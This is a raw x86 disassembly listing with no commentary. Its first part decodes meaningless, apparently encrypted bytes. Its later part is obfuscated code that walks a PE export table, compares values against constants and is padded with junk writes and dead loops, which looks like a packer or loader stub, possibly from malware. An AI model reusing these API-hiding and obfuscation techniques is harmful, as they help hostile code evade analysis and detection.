  41e0ca:	in     eax,0xa4
  41e0cc:	xor    esi,eax
  41e0ce:	fsubr  DWORD PTR [ebx-0x14]
  41e0d1:	stc    
  41e0d2:	stos   DWORD PTR es:[edi],eax
  41e0d3:	out    0x10,eax
  41e0d5:	mov    ebp,0xf0cd2e29
  41e0da:	(bad)  
  41e0db:	out    dx,eax
  41e0dc:	jg     0x41e11c
  41e0de:	rcr    BYTE PTR [ecx+0x30],1
  41e0e1:	ror    esp,0x5
  41e0e4:	jbe    0x41e13a
  41e0e6:	lds    esi,FWORD PTR [esi+ebp*8+0x604a2178]
  41e0ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e0ee:	jecxz  0x41e117
  41e0f0:	rcr    BYTE PTR [ebx+0x5d],0x5c
  41e0f4:	fcomi  st,st(6)
  41e0f6:	test   DWORD PTR [ecx],ecx
  41e0f8:	in     al,dx
  41e0f9:	imul   esi,DWORD PTR [ebx+0x7f],0x24
  41e0fd:	fs ins BYTE PTR es:[edi],dx
  41e0ff:	dec    eax
  41e100:	sbb    BYTE PTR [ebx],0x5
  41e103:	push   edx
  41e104:	arpl   WORD PTR [esi],di
  41e106:	sahf   
  41e107:	sbb    WORD PTR [ebx],bx
  41e10a:	stc    
  41e10b:	popa   
  41e10c:	sahf   
  41e10d:	jae    0x41e0ee
  41e10f:	stos   BYTE PTR es:[edi],al
  41e110:	aas    
  41e111:	das    
  41e112:	sub    esp,DWORD PTR [ebp-0x56381065]
  41e118:	js     0x41e159
  41e11a:	jne    0x41e10b
  41e11c:	das    
  41e11d:	push   ecx
  41e11e:	or     dh,BYTE PTR [ecx-0x44a1a4a9]
  41e124:	ret    
  41e125:	xor    DWORD PTR [edi-0x4],esp
  41e128:	push   es
  41e129:	ret    0xd334
  41e12c:	adc    ecx,ebx
  41e12e:	sub    DWORD PTR [ecx-0x6c046b83],0xffffffb2
  41e135:	ins    BYTE PTR es:[edi],dx
  41e136:	push   ecx
  41e137:	loopne 0x41e145
  41e139:	mov    al,ds:0xff3b4db7
  41e13e:	hlt    
  41e13f:	sub    bh,BYTE PTR [ecx-0x70]
  41e142:	je     0x41e13b
  41e144:	push   ebx
  41e145:	jmp    0x41e155
  41e147:	pop    esp
  41e148:	mov    esi,0x2f375862
  41e14d:	test   BYTE PTR [edx-0x2f],bh
  41e150:	in     eax,0x30
  41e152:	rcr    esi,1
  41e154:	outs   dx,DWORD PTR ds:[esi]
  41e155:	sahf   
  41e156:	push   es
  41e157:	rcl    DWORD PTR [edi+0x23f09427],cl
  41e15d:	jge    0x41e1c1
  41e15f:	inc    ecx
  41e160:	nop
  41e161:	inc    eax
  41e162:	adc    al,BYTE PTR [ebx]
  41e164:	dec    edi
  41e165:	test   BYTE PTR [eax-0x105b9bb8],dl
  41e16b:	pop    ebx
  41e16c:	daa    
  41e16d:	dec    ah
  41e16f:	mov    WORD PTR [edx+eax*2+0x64ada61f],gs
  41e176:	jno    0x41e151
  41e178:	jle    0x41e162
  41e17a:	not    ch
  41e17c:	aad    0xe2
  41e17e:	into   
  41e17f:	inc    esp
  41e180:	xlat   BYTE PTR ds:[ebx]
  41e181:	ins    BYTE PTR es:[edi],dx
  41e182:	pusha  
  41e183:	cs cmc 
  41e185:	call   0xb89b3cf6
  41e18a:	push   es
  41e18b:	ds mov esi,0xeca32195
  41e191:	test   bl,0x15
  41e194:	push   esp
  41e195:	loop   0x41e167
  41e197:	data16 or dl,BYTE PTR [esi+ebx*8]
  41e19b:	and    al,0xb0
  41e19d:	sbb    al,0xe5
  41e19f:	inc    esp
  41e1a0:	ins    BYTE PTR es:[edi],dx
  41e1a1:	inc    edi
  41e1a2:	das    
  41e1a3:	clc    
  41e1a4:	cdq    
  41e1a5:	imul   esp,DWORD PTR [esi-0x44de6020],0xef0b1edb
  41e1af:	out    0x87,eax
  41e1b1:	mov    al,ds:0x87f1469
  41e1b6:	shl    esp,0xe5
  41e1b9:	push   edx
  41e1ba:	mov    ds:0x1ffac697,al
  41e1bf:	xor    DWORD PTR [ecx],ecx
  41e1c1:	mov    es,WORD PTR [ebp+0x69]
  41e1c4:	pushf  
  41e1c5:	scas   eax,DWORD PTR es:[edi]
  41e1c6:	jge    0x41e181
  41e1c8:	stos   BYTE PTR es:[edi],al
  41e1c9:	cmp    edi,DWORD PTR [ebx+0x28]
  41e1cc:	push   es
  41e1cd:	adc    DWORD PTR [edx],eax
  41e1cf:	mov    ah,BYTE PTR [ecx-0x2f]
  41e1d2:	mov    al,BYTE PTR [ebx-0x7324c08c]
  41e1d8:	shl    BYTE PTR [esi],0xc8
  41e1db:	je     0x41e251
  41e1dd:	jns    0x41e209
  41e1df:	arpl   sp,cx
  41e1e1:	inc    esi
  41e1e2:	sti    
  41e1e3:	sbb    bl,BYTE PTR [ebp-0x5f]
  41e1e6:	sar    cl,1
  41e1e8:	jnp    0x41e1bd
  41e1ea:	xchg   ecx,eax
  41e1eb:	push   esi
  41e1ec:	push   0x2a6ac8ae
  41e1f1:	cmp    eax,0x75436b2d
  41e1f6:	or     al,0x93
  41e1f8:	ins    DWORD PTR es:[edi],dx
  41e1f9:	adc    al,BYTE PTR [ebx]
  41e1fb:	or     edx,edi
  41e1fd:	daa    
  41e1fe:	lods   al,BYTE PTR ds:[esi]
  41e1ff:	mov    ch,0x3c
  41e201:	hlt    
  41e202:	or     bp,WORD PTR ds:[edi+0x41]
  41e207:	jae    0x41e213
  41e209:	mov    edx,0x6e194dca
  41e20e:	dec    edx
  41e20f:	cs sbb al,0x25
  41e212:	pop    esi
  41e213:	(bad)  [ebp+0x3a39cca]
  41e219:	fisub  DWORD PTR [ebp-0x43]
  41e21c:	fisttp DWORD PTR [ebp-0x1d8a2530]
  41e222:	inc    ecx
  41e223:	(bad)  
  41e224:	retf   
  41e225:	cwde   
  41e226:	mov    ds:0x7f4fc148,al
  41e22b:	aas    
  41e22c:	dec    esp
  41e22d:	xor    cl,BYTE PTR [ecx]
  41e22f:	xchg   esi,eax
  41e230:	push   edx
  41e231:	enter  0x231f,0xcd
  41e235:	dec    edi
  41e236:	int3   
  41e237:	lock test eax,0x8598e9c
  41e23d:	adc    dl,BYTE PTR [ebp+0x16]
  41e240:	ret    
  41e241:	sub    eax,0xe494f0a9
  41e246:	ss mov bh,0xcd
  41e249:	pop    ss
  41e24a:	sbb    al,cl
  41e24c:	adc    BYTE PTR [esi-0x16],bl
  41e24f:	add    al,0xe0
  41e251:	call   0x1392edd0
  41e256:	mov    ds:0xd500d287,al
  41e25b:	fimul  DWORD PTR es:[esi+edi*8-0x8]
  41e260:	nop
  41e261:	into   
  41e262:	add    eax,DWORD PTR ds:0x1003b0da
  41e268:	lock adc DWORD PTR [ebx],esp
  41e26b:	jo     0x41e2ba
  41e26d:	mov    bl,0x33
  41e26f:	je     0x41e20f
  41e271:	retf   
  41e272:	xchg   ecx,eax
  41e273:	pop    edx
  41e274:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e275:	fidiv  WORD PTR [esi-0x74]
  41e278:	icebp  
  41e279:	mov    WORD PTR [ebp+0xd],ds
  41e27c:	jp     0x41e2eb
  41e27e:	ins    DWORD PTR es:[edi],dx
  41e27f:	xchg   edx,eax
  41e280:	jmp    0x1d209935
  41e285:	pop    es
  41e286:	retf   0xea11
  41e289:	jp     0x41e241
  41e28b:	push   eax
  41e28c:	mov    eax,ds:0x24d76e1d
  41e291:	(bad)  
  41e292:	dec    ebx
  41e293:	push   esi
  41e294:	add    al,0x8f
  41e296:	mov    cl,BYTE PTR [esi]
  41e298:	dec    esi
  41e299:	sub    DWORD PTR [ebx+0x109513d2],eax
  41e29f:	push   ss
  41e2a0:	jle    0x41e2b1
  41e2a2:	and    BYTE PTR [esi+ebx*2+0x317647a9],dl
  41e2a9:	or     dl,dl
  41e2ab:	push   ebp
  41e2ac:	ret    0xbe66
  41e2af:	les    ebx,FWORD PTR [esi]
  41e2b1:	sbb    bh,BYTE PTR [eax]
  41e2b3:	push   0x66
  41e2b5:	inc    ecx
  41e2b6:	pop    esp
  41e2b7:	pop    ds
  41e2b8:	inc    esi
  41e2b9:	(bad)  
  41e2ba:	enter  0x62ab,0xa1
  41e2be:	ror    BYTE PTR [edx+0x69f9b1fa],1
  41e2c4:	mov    ds:0xd3612794,ax
  41e2ca:	xchg   ebx,eax
  41e2cb:	sar    DWORD PTR [ecx-0x40],1
  41e2ce:	push   ecx
  41e2d0:	add    eax,0x354cb2a2
  41e2d5:	in     al,0xf8
  41e2d7:	sahf   
  41e2d8:	push   ecx
  41e2d9:	xchg   ecx,eax
  41e2da:	stc    
  41e2db:	push   ds
  41e2dc:	repz and al,0xd5
  41e2df:	add    dl,BYTE PTR [edi]
  41e2e1:	enter  0x56e4,0xa8
  41e2e5:	dec    edi
  41e2e6:	push   es
  41e2e7:	pushf  
  41e2e8:	outs   dx,DWORD PTR ds:[esi]
  41e2e9:	sbb    bh,BYTE PTR [edx]
  41e2eb:	inc    ecx
  41e2ec:	ror    DWORD PTR [esi-0x54a33365],1
  41e2f2:	pop    esi
  41e2f3:	(bad)  [esi]
  41e2f5:	ror    BYTE PTR [edx+ebp*1],cl
  41e2f8:	sti    
  41e2f9:	xor    eax,0x80039ebc
  41e2fe:	mov    ch,0x96
  41e300:	inc    esp
  41e301:	fdiv   st,st(7)
  41e303:	push   ss
  41e304:	dec    ecx
  41e305:	jle    0x41e2be
  41e307:	cmp    ch,0x88
  41e30a:	ss cmp eax,0x28e70c6
  41e310:	mov    bh,0x1b
  41e312:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e313:	and    al,0xe2
  41e315:	inc    edi
  41e316:	aas    
  41e317:	cli    
  41e318:	push   cs
  41e319:	mov    edi,DWORD PTR [edi]
  41e31b:	mov    ebx,DWORD PTR [eax+0x3c]
  41e31e:	lea    edi,[ebx+edi*8+0x78]
  41e322:	mov    edi,DWORD PTR [edi+eax*1]
  41e325:	mov    DWORD PTR [ebp-0x18],edi
  41e328:	mov    edi,DWORD PTR [ebp+0x8]
  41e32b:	xor    edi,ecx
  41e32d:	add    edi,edx
  41e32f:	mov    DWORD PTR [ebp-0x1c],edi
  41e332:	mov    edi,DWORD PTR [ebp+0x8]
  41e335:	xor    edi,ecx
  41e337:	mov    ecx,DWORD PTR [ebp-0x18]
  41e33a:	add    edi,edx
  41e33c:	cmp    ecx,edi
  41e33e:	je     0x41e380
  41e344:	mov    ecx,DWORD PTR [ebp-0x18]
  41e347:	add    ecx,eax
  41e349:	mov    DWORD PTR [ebp-0x1c],ecx
  41e34c:	mov    ecx,DWORD PTR [ebp-0x30]
  41e34f:	mov    edx,DWORD PTR [ebp-0x2c]
  41e352:	mov    edx,0xa145
  41e357:	xor    cx,dx
  41e35a:	mov    edx,DWORD PTR [ebp-0x1c]
  41e35d:	mov    edx,DWORD PTR [edx+0xc]
  41e360:	add    cx,si
  41e363:	cmp    WORD PTR [eax+edx*1],cx
  41e367:	jne    0x41e380
  41e36d:	mov    ecx,DWORD PTR ds:0x428365
  41e373:	mov    ecx,DWORD PTR [ecx+0x198]
  41e379:	mov    DWORD PTR [ecx],eax
  41e37b:	jmp    0x41e3db
  41e380:	push   DWORD PTR [ebp+0x1c]
  41e383:	push   DWORD PTR [ebp+0x18]
  41e386:	jmp    0x41e3ca
  41e38b:	mov    eax,DWORD PTR [ebp+0x18]
  41e38e:	mov    ecx,DWORD PTR [ebp+0x1c]
  41e391:	cmp    eax,0x70941f92
  41e396:	jne    0x41e3af
  41e39c:	cmp    ecx,ebx
  41e39e:	jne    0x41e3af
  41e3a4:	push   ebx
  41e3a5:	push   0x70941f9c
  41e3aa:	jmp    0x41e3ca
  41e3af:	mov    eax,DWORD PTR [ebp+0x18]
  41e3b2:	mov    ecx,DWORD PTR [ebp+0x1c]
  41e3b5:	cmp    eax,0x70941f9c
  41e3ba:	jne    0x41e3db
  41e3c0:	cmp    ecx,ebx
  41e3c2:	jne    0x41e3db
  41e3c8:	push   ebx
  41e3c9:	push   edi
  41e3ca:	push   DWORD PTR [ebp+0x14]
  41e3cd:	push   DWORD PTR [ebp+0x10]
  41e3d0:	push   DWORD PTR [ebp+0xc]
  41e3d3:	push   DWORD PTR [ebp+0x8]
  41e3d6:	call   0x417181
  41e3db:	pop    edi
  41e3dc:	pop    esi
  41e3dd:	pop    ebx
  41e3de:	leave  
  41e3df:	ret    0x18
  41e3e2:	push   ebp
  41e3e3:	mov    ebp,esp
  41e3e5:	and    esp,0xfffffff8
  41e3e8:	sub    esp,0xcc
  41e3ee:	mov    al,ds:0x42848a
  41e3f3:	push   ebx
  41e3f4:	mov    DWORD PTR ds:0x428e39,0x550e
  41e3fe:	push   esi
  41e3ff:	mov    DWORD PTR ds:0x428e29,0x154d
  41e409:	push   edi
  41e40a:	mov    DWORD PTR ds:0x428e49,0x193
  41e414:	mov    BYTE PTR [esp+0xd6],0x0
  41e41c:	cmp    al,BYTE PTR ds:0x428497
  41e422:	je     0x41e439
  41e428:	xor    eax,eax
  41e42a:	mov    DWORD PTR ds:0x428e81,0x6e70
  41e434:	jmp    0x41f510
  41e439:	mov    al,ds:0x4284a3
  41e43e:	mov    DWORD PTR ds:0x428ecd,0xf87
  41e448:	cmp    al,BYTE PTR ds:0x4284b4
  41e44e:	jne    0x41e428
  41e454:	mov    edi,DWORD PTR ds:0x42ca5c
  41e45a:	push   0x4284bd
  41e45f:	adc    DWORD PTR ds:0x428e35,0x428eb9
  41e469:	push   0x4284c9
  41e46e:	call   edi
  41e470:	sbb    DWORD PTR ds:0x428e45,0x428eb5
  41e47a:	test   eax,eax
  41e47c:	mov    DWORD PTR ds:0x428e85,0x5858
  41e486:	je     0x41e428
  41e48c:	push   0x1
  41e48e:	and    DWORD PTR ds:0x428e85,0x768a
  41e498:	push   0x9765765
  41e49d:	call   DWORD PTR ds:0x42ca34
  41e4a3:	and    DWORD PTR ds:0x428e49,0x546c
  41e4ad:	push   0x4284d9
  41e4b2:	sub    DWORD PTR ds:0x428e55,0x3ef4
  41e4bc:	lea    eax,[esp+0x5c]
  41e4c0:	adc    DWORD PTR ds:0x428ecd,0x2de
  41e4ca:	push   eax
  41e4cb:	xor    DWORD PTR ds:0x428e65,0x1e99
  41e4d5:	call   DWORD PTR ds:0x42ca44
  41e4db:	add    DWORD PTR ds:0x428e9d,edi
  41e4e1:	mov    DWORD PTR [esp+0x30],0x0
  41e4e9:	or     edx,esi
  41e4eb:	mov    ecx,0xf89c85b9
  41e4f0:	adc    edx,edx
  41e4f2:	mov    DWORD PTR [esp+0x28],ecx
  41e4f6:	mov    DWORD PTR [esp+0xc],0xf89c85b8
  41e4fe:	dec    esi
  41e4ff:	lea    eax,[esp+0x3c]
  41e503:	and    DWORD PTR ds:0x428ea9,0x0
  41e50d:	xor    edx,edx
  41e50f:	add    edx,DWORD PTR ds:0x428ea9
  41e515:	inc    edx
  41e516:	mov    DWORD PTR ds:0x428ea9,edx
  41e51c:	cmp    DWORD PTR ds:0x428ea9,0x21
  41e523:	jle    0x41e54e
  41e529:	jmp    0x41e541
  41e52e:	push   0x428124
  41e533:	push   DWORD PTR [ebp-0x14]
  41e536:	push   0x1e1e
  41e53b:	call   DWORD PTR ds:0x42ca60
  41e541:	cmp    DWORD PTR ds:0x428ea9,0x17
  41e548:	jb     0x41e50d
  41e54e:	mov    DWORD PTR [esp+0x30],eax
  41e552:	adc    esi,DWORD PTR ds:0x428ead
  41e558:	lea    eax,[esp+0x38]
  41e55c:	and    DWORD PTR ds:0x428e89,0x0
  41e566:	jmp    0x41e578
  41e56b:	mov    ebx,DWORD PTR ds:0x428e89
  41e571:	inc    ebx
  41e572:	mov    DWORD PTR ds:0x428e89,ebx
  41e578:	cmp    DWORD PTR ds:0x428e89,0x11
  41e57f:	jae    0x41e5ca
  41e585:	cmp    DWORD PTR ds:0x428e89,0x5
  41e58c:	jb     0x41e5ca
  41e592:	jmp    0x41e5ab
  41e597:	push   0x42814e
  41e59c:	push   DWORD PTR [ebp-0x24]
  41e59f:	push   DWORD PTR [ebp-0x10]
  41e5a2:	push   DWORD PTR [ebp-0x18]
  41e5a5:	call   DWORD PTR ds:0x42ca64
  41e5ab:	cmp    DWORD PTR ds:0x428e89,0x4
  41e5b2:	jne    0x41e5c5
  41e5b8:	mov    ebx,DWORD PTR ds:0x428e89
  41e5be:	inc    ebx
  41e5bf:	mov    DWORD PTR ds:0x428e89,ebx
  41e5c5:	jmp    0x41e56b
  41e5ca:	mov    DWORD PTR [esp+0x18],eax
  41e5ce:	xor    esi,esi
  41e5d0:	or     esi,DWORD PTR ds:0x428eb9
  41e5d6:	or     DWORD PTR ds:0x428e25,esi
  41e5dc:	mov    eax,ds:0x428365
  41e5e1:	mov    eax,DWORD PTR [eax+0x1c8]
  41e5e7:	mov    eax,DWORD PTR [eax]
  41e5e9:	mov    DWORD PTR ds:0x428e9d,0x1c
  41e5f3:	cmp    DWORD PTR ds:0x428e9d,0x0
  41e5fa:	je     0x41e64a
  41e600:	cmp    DWORD PTR ds:0x428e9d,0x3
  41e607:	jl     0x41e64a
  41e60d:	jmp    0x41e61e
  41e612:	push   DWORD PTR [ebp-0x24]
  41e615:	push   DWORD PTR [ebp-0x28]
  41e618:	call   DWORD PTR ds:0x42ca18
  41e61e:	cmp    DWORD PTR ds:0x428e9d,0x4
  41e625:	jne    0x41e638
  41e62b:	mov    ebx,DWORD PTR ds:0x428e9d
  41e631:	dec    ebx
  41e632:	mov    DWORD PTR ds:0x428e9d,ebx
  41e638:	mov    ebx,DWORD PTR ds:0x428e9d
  41e63e:	dec    ebx
  41e63f:	mov    DWORD PTR ds:0x428e9d,ebx
  41e645:	jmp    0x41e5f3
  41e64a:	mov    edx,DWORD PTR [esp+0x18]
  41e64e:	adc    DWORD PTR ds:0x428ec9,edi
  41e654:	mov    esi,0x75108b1
  41e659:	sub    ebx,0x34f9
  41e65f:	xor    eax,esi
  41e661:	add    DWORD PTR ds:0x428e39,0x7d93
  41e66b:	mov    ebx,0x3272f8
  41e670:	or     DWORD PTR ds:0x428e6d,0x428e29
  41e67a:	add    eax,ebx
  41e67c:	mov    DWORD PTR ds:0x428e35,0x4692
  41e686:	mov    DWORD PTR [edx],eax
  41e688:	not    eax
  41e68a:	mov    eax,ds:0x428ce5
  41e68f:	cmp    eax,0x455dedfa
  41e694:	jne    0x41e6fe
  41e69a:	neg    eax
  41e69c:	mov    eax,DWORD PTR [esp+0x28]
  41e6a0:	mov    edx,DWORD PTR ds:0x428365
  41e6a6:	xor    DWORD PTR ds:0x428e91,0x428ebd
  41e6b0:	mov    edx,DWORD PTR [edx+0x198]
  41e6b6:	xor    eax,esi
  41e6b8:	add    DWORD PTR ds:0x428e9d,0x1078
  41e6c2:	add    eax,ebx
  41e6c4:	add    DWORD PTR ds:0x428e89,0x4c2a
  41e6ce:	mov    DWORD PTR [edx],eax
  41e6d0:	mov    eax,DWORD PTR [esp+0x28]
  41e6d4:	xor    eax,esi
  41e6d6:	add    eax,ebx
  41e6d8:	mov    ds:0x428ce5,eax
  41e6dd:	mov    eax,DWORD PTR [esp+0x28]
  41e6e1:	sub    DWORD PTR ds:0x428e41,0x428ec9
  41e6eb:	xor    eax,esi
  41e6ed:	add    eax,ebx
  41e6ef:	or     DWORD PTR ds:0x428e45,0x428e35
  41e6f9:	mov    ds:0x42845d,eax
  41e6fe:	and    DWORD PTR ds:0x428e85,0x0
  41e708:	jmp    0x41e718
  41e70d:	mov    eax,ds:0x428e85
  41e712:	inc    eax
  41e713:	mov    ds:0x428e85,eax
  41e718:	cmp    DWORD PTR ds:0x428e85,0x15
  41e71f:	jae    0x41e74a
  41e725:	cmp    DWORD PTR ds:0x428e85,0x18
  41e72c:	jg     0x41e74a
  41e732:	jmp    0x41e745
  41e737:	push   0x467c
  41e73c:	push   DWORD PTR [ebp-0x14]
  41e73f:	call   DWORD PTR ds:0x42ca1c
  41e745:	jmp    0x41e70d
  41e74a:	mov    eax,ds:0x428365
  41e74f:	mov    eax,DWORD PTR [eax+0x18c]
  41e755:	mov    eax,DWORD PTR [eax]
  41e757:	sbb    DWORD PTR ds:0x428eb1,0x2dbb
  41e761:	mov    DWORD PTR [esp+0x40],eax
  41e765:	movzx  eax,WORD PTR ds:0x428ea5
  41e76c:	sub    DWORD PTR ds:0x428e6d,eax
  41e772:	mov    eax,0xf89c85bd
  41e777:	mov    DWORD PTR [esp+0x10],eax
  41e77b:	mov    DWORD PTR [esp+0x10],eax
  41e77f:	mov    DWORD PTR [esp+0x10],eax
  41e783:	add    DWORD PTR ds:0x428e65,0x428e6d
  41e78d:	mov    DWORD PTR [esp+0x10],ecx
  41e791:	sub    DWORD PTR ds:0x428e5d,0x428e6d
  41e79b:	mov    DWORD PTR [esp+0x18],eax
  41e79f:	mov    DWORD PTR [esp+0x18],0xf89c85a1
  41e7a7:	mov    eax,ds:0x428ec1
  41e7ac:	add    DWORD PTR ds:0x428e89,eax
  41e7b2:	mov    eax,DWORD PTR [esp+0x28]
  41e7b6:	xor    eax,esi
  41e7b8:	add    eax,ebx
  41e7ba:	jmp    0x41e98b
  41e7bf:	mov    al,ds:0x4284de
  41e7c4:	cmp    al,BYTE PTR ds:0x4284eb
  41e7ca:	jne    0x41e428
  41e7d0:	mov    al,ds:0x4284f7
  41e7d5:	cmp    al,BYTE PTR ds:0x428508
  41e7db:	mov    DWORD PTR ds:0x428ea1,0x1959
  41e7e5:	jne    0x41e428
  41e7eb:	push   0x428511
  41e7f0:	xor    DWORD PTR ds:0x428e5d,0x2e26
  41e7fa:	push   0x42851d
  41e7ff:	call   edi
  41e801:	or     DWORD PTR ds:0x428e59,0x428eb9
  41e80b:	test   eax,eax
  41e80d:	mov    DWORD PTR ds:0x428e99,0x6eaa
  41e817:	je     0x41e428
  41e81d:	mov    al,ds:0x42852e
  41e822:	cmp    al,BYTE PTR ds:0x42853b
  41e828:	mov    DWORD PTR ds:0x428e4d,0x38ed
  41e832:	jne    0x41e428
  41e838:	mov    DWORD PTR ds:0x428e65,0x1c9c
  41e842:	mov    al,ds:0x428547
  41e847:	mov    DWORD PTR ds:0x428ecd,0x75a8
  41e851:	cmp    al,BYTE PTR ds:0x428558
  41e857:	mov    DWORD PTR ds:0x428e71,0x3bcf
  41e861:	jne    0x41e428
  41e867:	adc    DWORD PTR ds:0x428ead,0x428ebd
  41e871:	push   0x428561
  41e876:	inc    DWORD PTR ds:0x428ec1
  41e87c:	push   0x42856d
  41e881:	call   edi
  41e883:	test   eax,eax
  41e885:	mov    DWORD PTR ds:0x428e31,0x5531
  41e88f:	je     0x41e428
  41e895:	sub    eax,0x55e1
  41e89a:	mov    eax,DWORD PTR [esp+0xc]
  41e89e:	sbb    DWORD PTR ds:0x428ea1,0x6f3f
  41e8a8:	mov    ecx,DWORD PTR [esp+0x18]
  41e8ac:	add    DWORD PTR ds:0x428e8d,0x428e31
  41e8b6:	xor    eax,esi
  41e8b8:	adc    DWORD PTR ds:0x428e79,0x1de7
  41e8c2:	lea    eax,[eax+ecx*1+0x3272f8]
  41e8c9:	push   eax
  41e8ca:	mov    eax,DWORD PTR [esp+0x14]
  41e8ce:	and    DWORD PTR ds:0x428e61,0x6940
  41e8d8:	xor    eax,esi
  41e8da:	xor    DWORD PTR ds:0x428e85,0x2762
  41e8e4:	lea    eax,[ebp+eax*1+0x327300]
  41e8eb:	push   eax
  41e8ec:	xor    eax,0x37bf
  41e8f1:	mov    eax,ds:0x428365
  41e8f6:	push   DWORD PTR [eax+0x1bc]
  41e8fc:	xor    DWORD PTR ds:0x428e49,0x22e4
  41e906:	call   0x41f519
  41e90b:	xor    edx,edx
  41e90d:	xor    edx,DWORD PTR ds:0x428eed
  41e913:	mov    ecx,DWORD PTR ds:0x428efd
  41e919:	sub    ecx,edx
  41e91b:	sub    edx,DWORD PTR [edx+ecx*1]
  41e91e:	mov    eax,DWORD PTR [esp+0xc]
  41e922:	and    DWORD PTR ds:0x428ebd,0x0
  41e92c:	jmp    0x41e940
  41e931:	xor    edx,edx
  41e933:	add    edx,DWORD PTR ds:0x428ebd
  41e939:	inc    edx
  41e93a:	mov    DWORD PTR ds:0x428ebd,edx
  41e940:	cmp    DWORD PTR ds:0x428ebd,0x12
  41e947:	jae    0x41e972
  41e94d:	cmp    DWORD PTR ds:0x428ebd,0x1a
  41e954:	jbe    0x41e972
  41e95a:	jmp    0x41e96d
  41e95f:	push   0x4280ab
  41e964:	push   DWORD PTR [ebp-0x24]
  41e967:	call   DWORD PTR ds:0x42ca20
  41e96d:	jmp    0x41e931
  41e972:	mov    ecx,DWORD PTR [esp+0x18]
  41e976:	add    DWORD PTR ds:0x428ebd,edi
  41e97c:	xor    eax,esi
  41e97e:	xor    edx,DWORD PTR ds:0x428eb1
  41e984:	lea    eax,[ecx+eax*1+0x3272f8]
  41e98b:	and    DWORD PTR ds:0x428e29,0x0
  41e995:	jmp    0x41e9a9
  41e99a:	xor    ecx,ecx
  41e99c:	add    ecx,DWORD PTR ds:0x428e29
  41e9a2:	inc    ecx
  41e9a3:	mov    DWORD PTR ds:0x428e29,ecx
  41e9a9:	cmp    DWORD PTR ds:0x428e29,0x1b
  41e9b0:	jae    0x41e9f5
  41e9b6:	cmp    DWORD PTR ds:0x428e29,0x4
  41e9bd:	jbe    0x41e9f5
  41e9c3:	jmp    0x41e9d6
  41e9c8:	push   0x428092
  41e9cd:	push   DWORD PTR [ebp-0x1c]
  41e9d0:	call   DWORD PTR ds:0x42ca24
  41e9d6:	cmp    DWORD PTR ds:0x428e29,0x3
  41e9dd:	jne    0x41e9f0
  41e9e3:	mov    ecx,DWORD PTR ds:0x428e29
  41e9e9:	inc    ecx
  41e9ea:	mov    DWORD PTR ds:0x428e29,ecx
  41e9f0:	jmp    0x41e99a
  41e9f5:	mov    ecx,DWORD PTR [esp+0xc]
  41e9f9:	mov    edx,DWORD PTR [esp+0xc]
  41e9fd:	and    DWORD PTR ds:0x428e81,0x27c9
  41ea07:	xor    edx,esi
  41ea09:	xor    ecx,esi
  41ea0b:	add    ecx,edx
  41ea0d:	and    DWORD PTR ds:0x428eb9,0x0
  41ea17:	mov    edx,DWORD PTR ds:0x428eb9
  41ea1d:	inc    edx
  41ea1e:	mov    DWORD PTR ds:0x428eb9,edx
  41ea24:	cmp    DWORD PTR ds:0x428eb9,0x23
  41ea2b:	jle    0x41ea4e
  41ea31:	jmp    0x41ea41
  41ea36:	push   0x3c70
  41ea3b:	call   DWORD PTR ds:0x42ca28
  41ea41:	cmp    DWORD PTR ds:0x428eb9,0x1b
  41ea48:	jb     0x41ea17
  41ea4e:	mov    edx,DWORD PTR [esp+0xc]
  41ea52:	adc    DWORD PTR ds:0x428ec9,0x428ecd
  41ea5c:	xor    edx,esi
  41ea5e:	mov    DWORD PTR ds:0x428e85,0x69c
  41ea68:	lea    ecx,[ecx+edx*1+0x9758e8]
  41ea6f:	mov    DWORD PTR ds:0x428ec1,0x5f48
  41ea79:	mov    DWORD PTR [esp+0x18],eax
  41ea7d:	mov    DWORD PTR ds:0x428e41,0x5aa0
  41ea87:	cmp    eax,ecx
  41ea89:	mov    DWORD PTR ds:0x428e69,0x3a73
  41ea93:	jbe    0x41e7bf
  41ea99:	and    ecx,DWORD PTR ds:0x428ed1
  41ea9f:	mov    eax,DWORD PTR [ebp+0xc]
  41eaa2:	mov    DWORD PTR ds:0x428e9d,0x14
  41eaac:	cmp    DWORD PTR ds:0x428e9d,0x0
  41eab3:	je     0x41eb02
  41eab9:	cmp    DWORD PTR ds:0x428e9d,0x3
  41eac0:	jb     0x41eb02
  41eac6:	jmp    0x41ead4
  41eacb:	push   DWORD PTR [ebp-0x18]
  41eace:	call   DWORD PTR ds:0x42ca2c
  41ead4:	cmp    DWORD PTR ds:0x428e9d,0x4
  41eadb:	jne    0x41eaee
  41eae1:	mov    ecx,DWORD PTR ds:0x428e9d
  41eae7:	dec    ecx
  41eae8:	mov    DWORD PTR ds:0x428e9d,ecx
  41eaee:	xor    ecx,ecx
  41eaf0:	add    ecx,DWORD PTR ds:0x428e9d
  41eaf6:	dec    ecx
  41eaf7:	mov    DWORD PTR ds:0x428e9d,ecx
  41eafd:	jmp    0x41eaac
  41eb02:	mov    ds:0x4281e9,eax
  41eb07:	sbb    eax,eax
  41eb09:	mov    eax,DWORD PTR [ebp+0x10]
  41eb0c:	mov    ds:0x428445,eax
  41eb11:	mov    eax,ds:0x4281e9
  41eb16:	mov    ecx,DWORD PTR [esp+0x30]
  41eb1a:	dec    DWORD PTR ds:0x428e99
  41eb20:	sub    eax,ebx
  41eb22:	xor    eax,esi
  41eb24:	mov    DWORD PTR ds:0x428e99,0x6c0e
  41eb2e:	mov    DWORD PTR [ecx],eax
  41eb30:	lea    eax,[esp+0x24]
  41eb34:	mov    DWORD PTR ds:0x428ea5,0x17d
  41eb3e:	mov    DWORD PTR [esp+0x44],eax
  41eb42:	lea    eax,[ebp+0x4]
  41eb45:	mov    DWORD PTR ds:0x428ec5,0x4441
  41eb4f:	mov    DWORD PTR [esp+0x24],eax
  41eb53:	mov    al,ds:0x42857e
  41eb58:	mov    DWORD PTR ds:0x428e49,0x46bb
  41eb62:	cmp    al,BYTE PTR ds:0x42858b
  41eb68:	jne    0x41e428
  41eb6e:	mov    al,ds:0x428597
  41eb73:	mov    DWORD PTR ds:0x428eb1,0x61de
  41eb7d:	cmp    al,BYTE PTR ds:0x4285a8
  41eb83:	mov    DWORD PTR ds:0x428e71,0x1a2b
  41eb8d:	jne    0x41e428
  41eb93:	push   0x4285b1
  41eb98:	sbb    DWORD PTR ds:0x428e8d,0x428e79
  41eba2:	push   0x4285bd
  41eba7:	sbb    DWORD PTR ds:0x428e75,0x428e6d
  41ebb1:	call   edi
